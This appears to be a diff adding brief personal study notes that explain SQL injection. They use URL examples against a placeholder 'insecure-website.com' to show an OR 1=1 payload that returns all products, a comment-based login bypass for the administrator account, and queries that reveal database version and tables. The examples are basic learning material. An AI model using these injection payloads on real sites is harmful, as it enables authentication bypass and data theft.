@@ -1,0 +1,45 @@
+What is sql injection:
+https://insecure-website.com/products?category=Gifts 
+Send a SQL to the database 
+SELECT * FROM products
+WHERE category = 'Gifts'
+AND released = 1 
+https://insecure-website.com/products?category=Gifts --
+Send a SQL to the database 
+SELECT * FROM products
+WHERE category = 'Gifts' --'
+AND released = 1 '
+
+https://insecure-website.com/products?category=Gifts'+OR+1=1-- (ask for all the products in all the category)
+SELECT * FROM products
+WHERE category = 'Gifts'
+OR 1=1--' AND released = 1 '
+
+if hacker type administrator'--
+SELECT * FROM users WHERE
+username = 'administrator' -- AND password ='
+
+use to examine the database :
+SELECT * FROM v$version (oracle)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+information_schema.tables
